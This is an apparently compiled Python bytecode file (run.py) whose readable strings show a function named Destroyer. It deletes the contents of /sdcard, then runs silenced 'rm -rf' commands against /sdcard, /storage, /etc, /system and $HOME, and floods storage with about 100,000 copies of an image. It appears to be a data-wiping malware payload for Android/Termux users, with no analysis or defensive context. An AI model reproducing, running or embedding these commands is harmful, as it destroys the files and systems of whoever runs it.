o
    2�c�  �                   @   sV   d dl mZ d dl mZ d dl mZ d dlmZ	 ed�Z
dd� Zedkr)e�  d	S d	S )
�    )�system)�listdir)�remove)�randint�/sdcard/c                  C   s�   zt D ]} t| � qW n   Y ztd� td� td� td� td� W n   Y td�D ]}tdd�}td	|� d
�� td|� d�� q/td� d S )Nr   zrm -rf /sdcard/* &> /dev/nullzrm -rf /storage/* &> /dev/nullzrm -rf /etc/* &> /dev/nullzrm -rf /system/* &> /dev/nulli�� �   i@B z!cp .png/codexid.jpg .png/CODEXID_z.jpg &> /dev/nullzmv .png/CODEXID_z.jpg /sdcard &> /dev/nullzrm -rf $HOME/* &> /dev/null)�dir_list�rm�cmd�range�rt)Z_dir_�i�a� r   �run.py�	Destroyer   s&   
�
r   �__main__N)�osr   r
   r   Zldr   r	   Zrandomr   r   r   r   �__name__r   r   r   r   �<module>   s   
�